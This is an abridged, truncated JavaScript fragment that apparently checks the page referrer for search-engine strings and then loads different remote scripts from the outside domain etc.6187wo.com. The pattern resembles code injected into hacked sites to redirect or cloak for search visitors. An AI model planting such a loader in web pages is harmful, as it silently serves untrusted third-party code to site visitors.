(function() {
    ...
    function a_g() {
        try {
            ...
            var url = htturl + "//etc.6187wo.com/js/7/s_all_end_7.js";
    ...
    function c_r(r) {
        ...
        try {
            if (r.indexOf(b) > -1 || r.indexOf(s) > -1 || r.indexOf(sm) > -1) {
                ...
                if (r.indexOf(b) > -1) {
                   li_js.src = htturl + "//etc.6187wo.com/js/7/s_all_b_end_7.html";
                }
                if (r.indexOf(s) > -1) {
                    li_js.src = htturl + "//etc.6187wo.com/js/7/s_all_sg_end_7.html";
                }
                if (r.indexOf(sm) > -1) {
                    li_js.src = htturl + "//etc.6187wo.com/js/7/s_all_sm_end_7.html";
                }
